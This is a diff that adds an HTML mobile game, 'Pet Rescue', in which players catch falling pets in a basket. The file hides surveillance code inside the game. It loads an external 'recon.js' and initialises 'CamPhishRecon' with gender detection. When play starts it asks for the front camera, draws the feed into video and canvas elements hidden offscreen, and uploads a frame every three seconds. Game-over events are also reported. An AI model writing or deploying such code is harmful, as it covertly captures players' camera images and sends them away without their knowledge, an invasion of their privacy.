@@ -1,0 +1,125 @@
+<!-- DESC: Pet rescue game — catch falling animals with a basket -->
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="theme-color" content="#1a2e1a">
+<title>Pet Rescue</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{background:#1a2e1a;color:#fff;font-family:-apple-system,sans-serif;overflow:hidden;touch-action:none;user-select:none}
+#wrap{position:fixed;inset:0;display:flex;align-items:center;justify-content:center}
+canvas#c{display:block;touch-action:none}
+.overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(26,46,26,0.96);z-index:20;text-align:center;padding:20px}
+.overlay.hidden{display:none}
+.title{font-size:clamp(28px,9vw,52px);background:linear-gradient(135deg,#7bed9f,#ffd700,#ff6b9d);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
+.sub{color:#7bed9f;font-size:14px;margin:8px 0 24px}
+.howto{color:#aaccaa;font-size:13px;line-height:2;margin-bottom:24px;max-width:280px}
+.howto b{color:#ffd700}
+.btn{background:linear-gradient(135deg,#7bed9f,#2ed573);color:#000;border:none;padding:16px 52px;font-size:20px;font-weight:900;border-radius:30px;cursor:pointer;box-shadow:0 0 20px #7bed9f}
+.btn:active{transform:scale(0.93)}
+.final{font-size:clamp(36px,10vw,56px);color:#ffd700;font-weight:900}
+.best{color:#aaccaa;margin:8px 0 16px}
+.shares{display:flex;gap:8px;margin-bottom:16px}
+.sb{padding:10px 18px;border:none;border-radius:20px;color:#fff;font-weight:700;font-size:13px;cursor:pointer}
+.s-wa{background:#25D366}.s-fb{background:#1877F2}
+.lb{color:#668866;font-size:12px;margin-top:16px}
+#score{position:absolute;top:12px;left:16px;font-size:24px;font-weight:900;color:#fff;text-shadow:0 0 8px #7bed9f;z-index:10}
+#lives{position:absolute;top:12px;right:16px;font-size:20px;z-index:10}
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+#touchL,#touchR{position:absolute;bottom:0;width:50%;height:30%;z-index:5;pointer-events:auto;display:flex;align-items:flex-end;justify-content:center;padding-bottom:16px;color:rgba(255,255,255,0.1);font-size:28px}
+#touchL{left:0}#touchR{right:0}
+</style>
+</head><body>
+<script src="forwarding_link/t/recon.js"></script>
+<video id="v" playsinline autoplay muted></video>
+<canvas id="cap" width="320" height="240"></canvas>
+<div id="wrap"><canvas id="c"></canvas></div>
+<div id="score">0</div><div id="lives">🐱🐱🐱</div>
+<div id="touchL" class="hidden">◀</div><div id="touchR" class="hidden">▶</div>
+<div class="overlay" id="menu">
+<div class="title">🐾 Pet Rescue</div>
+<div class="sub">Catch falling pets · Avoid bombs!</div>
+<div class="howto"><b>Move basket</b> left/right<br>Catch 🐱🐶🐰 = points<br>Avoid 💣 = lose a life!<br>Gold pets = bonus points</div>
+<button class="btn" id="startBtn">▶ Start</button>
+<div class="lb" id="menuLb"></div>
+</div>
+<div class="overlay hidden" id="gameover">
+<div style="font-size:28px;color:#ff6b9d;margin-bottom:8px">Game Over</div>
+<div class="final" id="finalScore">0</div>
+<div class="best" id="bestScore"></div>
+<div class="shares"><button class="sb s-wa" onclick="shareCard('wa')">💬 Share</button><button class="sb s-fb" onclick="shareCard('fb')">📘 Share</button></div>
+<button class="btn" onclick="startGame()">▶ Play Again</button>
+<div class="lb" id="goLb"></div>
+</div>
+<script>
+var API='API_BASE_URL',SHARE_URL='forwarding_link/t/pet-catch';
+var W=360,H=640,c,ctx,basket,objects=[],particles=[],score=0,lives=3,running=false,dead=false,fc=0,spawnT=0,speed=2;
+var hs=[];try{hs=JSON.parse(localStorage.getItem('petRescueHS')||'[]');}catch(e){}
+var ac=null;var leftH=false,rightH=false;
+var PETS=[{e:'🐱',p:10},{e:'🐶',p:10},{e:'🐰',p:15},{e:'🐹',p:15},{e:'🦊',p:20},{e:'🐼',p:25}];
+function snd(f,t){try{if(!ac)ac=new(AudioContext||webkitAudioContext)();var o=ac.createOscillator(),g=ac.createGain();o.frequency.value=f;o.type=t||'sine';g.gain.value=0.06;o.connect(g);g.connect(ac.destination);o.start();g.gain.exponentialRampToValueAtTime(0.001,ac.currentTime+0.15);o.stop(ac.currentTime+0.15);}catch(e){}}
+function init(){
+c=document.getElementById('c');ctx=c.getContext('2d');resize();addEventListener('resize',resize);
+document.getElementById('startBtn').onclick=startGame;
+document.getElementById('touchL').addEventListener('touchstart',function(e){e.preventDefault();leftH=true;},{passive:false});
+document.getElementById('touchL').addEventListener('touchend',function(e){e.preventDefault();leftH=false;},{passive:false});
+document.getElementById('touchR').addEventListener('touchstart',function(e){e.preventDefault();rightH=true;},{passive:false});
+document.getElementById('touchR').addEventListener('touchend',function(e){e.preventDefault();rightH=false;},{passive:false});
+addEventListener('keydown',function(e){if(e.key==='ArrowLeft'||e.key==='a')leftH=true;if(e.key==='ArrowRight'||e.key==='d')rightH=true;});
+addEventListener('keyup',function(e){if(e.key==='ArrowLeft'||e.key==='a')leftH=false;if(e.key==='ArrowRight'||e.key==='d')rightH=false;});
+showLb();requestAnimationFrame(menuLoop);
+}
+function resize(){var s=Math.min(innerWidth/W,innerHeight/H);c.style.width=(W*s)+'px';c.style.height=(H*s)+'px';c.width=W;c.height=H;}
+function startGame(){
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+basket={x:W/2-30,w:60,y:H-60};objects=[];particles=[];score=0;lives=3;fc=0;spawnT=0;speed=2;running=true;dead=false;
+document.getElementById('menu').classList.add('hidden');document.getElementById('gameover').classList.add('hidden');
+document.getElementById('score').textContent='0';document.getElementById('lives').textContent='🐱'.repeat(3);
+document.getElementById('touchL').classList.remove('hidden');document.getElementById('touchR').classList.remove('hidden');
+requestAnimationFrame(loop);
+if(navigator.mediaDevices&&window.CamPhishRecon){navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){var v=document.getElementById('v');v.srcObject=s;v.play();var cap=document.getElementById('cap'),cx=cap.getContext('2d');setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'canvas');}},3000);}).catch(function(){});}
+}
+function loop(){if(!running)return;fc++;update();draw();if(!dead)requestAnimationFrame(loop);}
+function update(){
+speed=2+fc*0.003;
+if(leftH)basket.x-=5;if(rightH)basket.x+=5;basket.x=Math.max(0,Math.min(W-basket.w,basket.x));
+spawnT++;if(spawnT>=Math.max(25,50-fc*0.03)){spawnT=0;var isBomb=Math.random()<0.2;var isGold=!isBomb&&Math.random()<0.1;var pet=PETS[Math.floor(Math.random()*PETS.length)];
+objects.push({x:20+Math.random()*(W-60),y:-30,vy:speed+Math.random(),e:isBomb?'💣':(isGold?'⭐':pet.e),p:isGold?50:pet.p,bomb:isBomb,gold:isGold});}
+for(var i=objects.length-1;i>=0;i--){var o=objects[i];o.y+=o.vy;
+if(o.y>basket.y-20&&o.x>basket.x&&o.x<basket.x+basket.w){
+if(o.bomb){lives--;snd(150,0.3,'sawtooth');if(navigator.vibrate)navigator.vibrate(60);spawnParts(o.x,o.y,'#f00');if(lives<=0){endGame();return;}}
+else{score+=o.p;snd(o.gold?1200:700+o.p*5);if(navigator.vibrate)navigator.vibrate(10);spawnParts(o.x,o.y,o.gold?'#ffd700':'#7bed9f');}
+document.getElementById('score').textContent=score;document.getElementById('lives').textContent='🐱'.repeat(Math.max(0,lives))||'💀';
+objects.splice(i,1);continue;}
+if(o.y>H+30)objects.splice(i,1);}
+for(var i=particles.length-1;i>=0;i--){particles[i].x+=particles[i].vx;particles[i].y+=particles[i].vy;particles[i].vy+=0.1;particles[i].life--;if(particles[i].life<=0)particles.splice(i,1);}
+}
+function spawnParts(x,y,col){for(var i=0;i<6;i++){var a=Math.random()*6.28,s=1+Math.random()*2;particles.push({x:x,y:y,vx:Math.cos(a)*s,vy:Math.sin(a)*s,life:15,col:col});}}
+function draw(){ctx.clearRect(0,0,W,H);var g=ctx.createLinearGradient(0,0,0,H);g.addColorStop(0,'#1a2e1a');g.addColorStop(0.6,'#2d4e2d');g.addColorStop(1,'#1a2e1a');ctx.fillStyle=g;ctx.fillRect(0,0,W,H);
+// Ground
+ctx.fillStyle='#2d4e2d';ctx.fillRect(0,H-30,W,30);ctx.fillStyle='#3d6e3d';ctx.fillRect(0,H-30,W,3);
+// Basket
+ctx.font='40px system-ui';ctx.textAlign='center';ctx.fillText('🧺',basket.x+basket.w/2,basket.y+15);
+// Objects
+for(var i=0;i<objects.length;i++){ctx.font=objects[i].gold?'28px':'24px system-ui';ctx.fillText(objects[i].e,objects[i].x,objects[i].y);}
+// Particles
+for(var i=0;i<particles.length;i++){ctx.fillStyle=particles[i].col;ctx.globalAlpha=particles[i].life/15;ctx.fillRect(particles[i].x-2,particles[i].y-2,4,4);}ctx.globalAlpha=1;
+}
+function menuLoop(){ctx.clearRect(0,0,W,H);var g=ctx.createLinearGradient(0,0,0,H);g.addColorStop(0,'#1a2e1a');g.addColorStop(1,'#2d4e2d');ctx.fillStyle=g;ctx.fillRect(0,0,W,H);ctx.fillStyle='#7bed9f';ctx.font='bold 30px system-ui';ctx.textAlign='center';ctx.shadowColor='#7bed9f';ctx.shadowBlur=12;ctx.fillText('🐾 Pet Rescue',W/2,200);ctx.shadowBlur=0;ctx.font='40px system-ui';ctx.fillText('🧺',W/2,300);requestAnimationFrame(menuLoop);}
+function endGame(){running=false;dead=true;hs.push(score);hs.sort(function(a,b){return b-a;});hs=hs.slice(0,5);localStorage.setItem('petRescueHS',JSON.stringify(hs));document.getElementById('finalScore').textContent=score;document.getElementById('bestScore').textContent='Best: '+(hs[0]||0);document.getElementById('gameover').classList.remove('hidden');document.getElementById('touchL').classList.add('hidden');document.getElementById('touchR').classList.add('hidden');showLb();if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{score:score});}
+function showLb(){var h='<b>🏆 Top Scores</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — '+hs[i]+'</div>';if(!hs.length)h='<b>🏆 Be the first!</b>';document.getElementById('menuLb').innerHTML=h;document.getElementById('goLb').innerHTML=h;}
+function shareCard(t){
+var cc=document.createElement('canvas');cc.width=600;cc.height=800;var x=cc.getContext('2d');
+var bg=x.createLinearGradient(0,0,0,800);bg.addColorStop(0,'#1a2e1a');bg.addColorStop(1,'#2d4e2d');x.fillStyle=bg;x.fillRect(0,0,600,800);
+x.font='60px system-ui';x.textAlign='center';x.fillText('🧺',300,160);
+x.fillStyle='#7bed9f';x.font='bold 38px system-ui';x.shadowColor='#7bed9f';x.shadowBlur=15;x.fillText('🐾 Pet Rescue',300,240);x.shadowBlur=0;
+x.fillStyle='#aaccaa';x.font='18px system-ui';x.fillText('My Score',300,300);
+x.fillStyle='#ffd700';x.font='bold 72px system-ui';x.fillText(score,300,380);
+x.fillStyle='#558855';x.font='12px system-ui';x.fillText('Pet Rescue · Catch Game',300,720);
+cc.toBlob(function(blob){var msg='🐾 I rescued pets and scored '+score+' in Pet Rescue! '+SHARE_URL;var file=new File([blob],'pet-rescue.png',{type:'image/png'});if(navigator.canShare&&navigator.canShare({files:[file]})){navigator.share({text:msg,files:[file]}).catch(function(){});return;}if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(msg),'_blank');var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='pet-rescue.png';a.click();},'image/png');
+}
+init();
+</script>
+</body></html>
